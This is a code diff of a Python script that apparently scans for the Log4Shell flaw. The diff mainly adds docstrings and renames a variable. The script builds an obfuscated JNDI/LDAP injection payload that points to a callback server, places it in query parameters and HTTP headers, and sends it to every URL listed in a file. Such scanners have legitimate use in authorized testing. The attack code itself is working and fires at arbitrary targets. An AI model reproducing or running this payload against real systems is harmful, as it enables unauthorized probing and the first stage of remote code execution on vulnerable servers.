@@ -1,18 +1,30 @@
 import requests
 from colorama import Fore
-from requests.models import ReadTimeoutError
 
 # import concurrent.futures
 
 
 def open_file(file):
+    """
+    Receives 1 parameter: a file (mainly .txt).
+
+    Then it opens the file, reads it's lines, returns the lines through the "text" variable, and closes the file automatically.
+    """
     with open(file, "r") as f:
         text = f.readlines()
         return text
 
 
-def send_payload(url, burp_colab_string):
-    payload = f"${{${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}//{burp_colab_string}/a}}"
+def send_payload(url, server_string):
+    """
+    Receives 2 parameters: a url and a server_string that it's going to use to receive the response from the vulnerable website.
+
+    Sets payload, and then it creates dictionaries for both the parameters and headers, using the payload for the value
+    of all items in both ("params" and "headers") dictionaries.
+
+    Then it prints the url that it's about to test, and finally it sends a GET request to the corresponding website that received in the "url" parameter.
+    """
+    payload = f"${{${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}//{server_string}/a}}"
     params = {"id": payload, "keywords": payload}
     headers = {
         "User-Agent": payload,
@@ -34,11 +46,16 @@ def send_payload(url, burp_colab_string):
     requests.get(url, headers=headers, params=params, verify=False, timeout=10)
 
 
-def payload_sender(urls, burp_colab_string):
+def payload_sender(urls, server_string):
+    """
+    Receives 2 parameters: an iterable that contains multiple urls (in this case from a file) and a server_string that it's going to use to receive the response from the vulnerable website.
+
+    Then it iterates over the iterable that was provided through the "urls" parameter, and for each item on it, it'll call the "send_payload" with both the item and the "server_string".
+    """
     try:
         # with concurrent.futures.ThreadPoolExecutor() as executor:
         #     executor.map(send_payload, urls, burp_colab_string)
         for url in urls:
-            send_payload(url, burp_colab_string)
+            send_payload(url, server_string)
     except:
         print(f"{Fore.RED}SOMETHING WENT WRONG.")
